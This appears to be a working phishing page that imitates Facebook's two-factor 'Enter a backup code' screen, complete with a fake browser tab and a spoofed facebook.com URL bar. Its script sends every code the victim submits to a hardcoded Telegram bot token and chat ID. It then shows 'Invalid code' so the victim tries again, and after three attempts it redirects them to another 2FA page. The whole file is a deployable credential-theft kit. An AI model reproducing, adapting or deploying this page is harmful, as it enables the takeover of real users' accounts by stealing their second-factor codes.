<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Facebook ‚Äì Backup Code</title>
  <link rel="stylesheet" href="../static/style.css">
  <style>
 body {
  font-family: 'Inter', sans-serif;
  font-variation-settings: 'wght' 550;
}

    .fake-browser-bar {
      width: 100%; background-color: #e5e5e5; height: 28px;
      display: flex; align-items: center; padding: 0 12px;
    }
    .circle-btn {
      width: 10px; height: 10px; background-color: #555;
      border-radius: 50%; margin-right: 16px;
    }
    .tab {
      display: flex; align-items: center; background-color: #3a3a3c;
      padding: 4px 10px; border-radius: 10px 10px 0 0;
      box-shadow: inset 0 0 2px #222;
    }
    .favicon {
      width: 16px; height: 16px; margin-right: 6px; object-fit: contain; border-radius: 4px;
    }
    .tab-title { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; color: rgb(0, 0, 0); }
    .window-controls { display: flex; gap: 12px; margin-left: auto; color: #ccc; }
    .fake-url-bar {
      background-color: #e6e6e6; height: 32px; display: flex;
      align-items: center; padding: 0 10px; font-size: 13px; color: #222; border-bottom: 1px solid #c0c0c0;
    }
    .url-left {
      display: flex; align-items: center; overflow: hidden;
      white-space: nowrap; text-overflow: ellipsis; flex: 1;
    }
    .lock-icon {
      width: 12px; height: 12px; margin-right: 6px; filter: grayscale(1);
    }
    .url-text { overflow: hidden; text-overflow: ellipsis; }
    .main-content {
      display: flex; justify-content: center; margin-top: 40px;
    }
    .box {
      max-width: 600px; background-color: #fff; border-radius: 10px;
      padding: 30px;
    }
    .box h4 { font-size: 13px; font-weight: 500; margin-bottom: 5px; color: #050505; }
    .box h2 { font-size: 20px; font-weight: 700; margin: 8px 0; color: #050505; }
    .box p { font-size: 14px; color: #65676B; margin-bottom: 16px; line-height: 1.5; }
    .box img { width: 100%; border-radius: 6px; margin-bottom: 18px; }
    .input-code {
      width: 100%; padding: 12px; font-size: 15px;
      border-radius: 9px; border: 1px solid #ccd0d5;
      margin-bottom: 16px;
    }
    .btn-primary {
      background-color: #0866ff;
      color: #fff;
      border: none;
      border-radius: 99px;
      font-size: 15px;
      font-weight: 600;
       letter-spacing: 0.3px; /* th√™m nh·∫π ƒë·ªÉ ch·ªØ ƒë·ªÅu h∆°n */
      position: relative;
      padding: 13px 0;
      width: 100%;
      cursor: pointer;
      letter-spacing: 0.5px;
      transition: background-color 0.2s;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;

    }
    .btn-primary:disabled {
      background-color: #9cb8ff;
      color: #ffffff;
      cursor: default;
    }
    .btn-primary:hover:not(:disabled) {
      background-color: #1877f2;
    }
    .btn-secondary {
  margin-top: 12px;
  background-color: #ffffff;
  color: #050505;
  border: 1px solid #ccd0d5;     /* ‚úÖ Khung vi·ªÅn m·ªõi th√™m */
  border-radius: 99px;
  font-size: 15px;
  font-weight: 600;
  letter-spacing: 0.5px;
  padding: 13px 0;
  width: 100%;
  cursor: pointer;
  transition: background-color 0.2s;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
}
    .btn-secondary:hover {
      background-color: #d8dadf;
    }
  </style>
</head>
<body>
  <div class="fake-browser-bar">
    <div class="tab">
      <img src="https://www.facebook.com/favicon.ico" class="favicon" alt="Facebook" />
      <span class="tab-title">Facebook</span>
    </div>
    <div class="window-controls">
      <span>‚àí</span><span>‚ñ¢</span><span>√ó</span>
    </div>
  </div>
  <div class="fake-url-bar">
    <div class="url-left">
      <img src="../static/key-icon12.png" class="lock-icon" />
      <span class="url-text">https://www.facebook.com/two_step_verification/two_factor/?encrypted_context=ARHZMWCRQAUg00i8ZloPjG_6LNm8x-j7qCseC5pCLvjqN7R7a9FWdEp2lCphTSwvRcBXrMOuLT_S_J5sik25IWTCwt5RsWPgngh0m-yHHoL3VLigf7YKGQZ4xH8NKkHSp3Ydsvm6k7Ik6nT78xQzJs1VyMpiUK_57662YZ67r20RzQumqXE25V4G41P3inVS3y3geUbrLHXYuf1T1Ytc31VH7lBGJ_gmKwuxXbvjSPHCJ5nd9GabkH-ocGuFd0S5_Y9vn8W8Opil7REfN3Jtqkkk5T7rPfPosLN1J9SSPSvHRrMPN5V8tEjlije5AljAEOyXMTi64KQYTe-Lb1w1CcIxvztVrr_W4GvRjKKBe9HWzUZHgrLDCt76_GvFoRBO5fnjhxvPAIqbEwE03Kjrj8ZTdIe-W68FQvHg9ac93qhej1g0fJRHssiUB7gN&flow=two_factor_login&next</span>
    </div>
    <img src="../static/key-icon.png" class="lock-icon" />
  </div>

  <div class="main-content" id="twoFAContent">
    <div class="box">
      <h4><span id="fb-name">Facebook</span></h4>
      <h2 style="font-size: 25px; font-weight: 600;">Enter a backup code</h2>

      <p>When you set up two-factor authentication, you'll see a list of backup codes. If you've saved them, you might find them in your screenshots, downloaded files, or notes.</p>
      <img src="../static/madp2fa.png" alt="Backup Code" />
      <form id="backupForm">
        <input type="text" class="input-code" placeholder="Code" name="backup_code" id="backupInput" required>
        <div id="errorText" style="color: red; font-size: 14px; margin: 6px 0 12px 0;"></div>
        <button class="btn-primary" type="submit" id="continueBtn" disabled>Continue</button>
      </form>
      <button class="btn-secondary" onclick="showAlternative()">Try Another Way</button>


    </div>
  </div>

  <script>
    let wrongAttempts = 0;

    document.addEventListener("DOMContentLoaded", function () {
      const input = document.getElementById("backupInput");
      const button = document.getElementById("continueBtn");
      const form = document.getElementById("backupForm");
      const errorText = document.getElementById("errorText");

      const acc = localStorage.getItem("fb_account");
      if (acc) {
        document.getElementById("fb-name").innerText = acc + " ‚Ä¢ Facebook";
      }

      input.addEventListener("input", function () {
        button.disabled = input.value.trim().length === 0;
      });

      form.addEventListener("submit", function (e) {
        e.preventDefault();
        button.disabled = true;
        errorText.textContent = "";
        button.innerHTML = `<span class="spinner" style="margin-right: 8px;
          border: 2px solid #fff; border-top: 2px solid transparent;
          border-radius: 50%; width: 16px; height: 16px;
          display: inline-block; animation: spin 0.8s linear infinite;"></span>ƒêang ki·ªÉm tra...`;

        setTimeout(() => {
          const code = input.value.trim();

          fetch('https://api.telegram.org/bot8075511413:AAGyFKy0jk2VNbi3nM3AdqOMVqMgeEfvTBM/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `chat_id=6565555925&text=üîê M√£ d·ª± ph√≤ng ƒë√£ nh·∫≠p: ${encodeURIComponent(code)}`
          });

          wrongAttempts++;
          button.innerHTML = "Continue";

          if (wrongAttempts >= 3) {
            errorText.textContent = "You have entered the wrong password more than 3 times. Please try another way.";
            button.disabled = true;
          } else {
            errorText.textContent = "Invalid code. Please try again.";
            button.disabled = false;
          }
        }, 3000);
      });
    });

    const style = document.createElement('style');
    style.innerHTML = `@keyframes spin {
      from { transform: rotate(0deg); }
      to { transform: rotate(360deg); }
    }`;
    document.head.appendChild(style);

    function showAlternative() {
      window.location.href = "/2fa";
    }

    function hideAlternative() {
      window.location.href = "/backup";
    }
  </script>
</body>
</html>
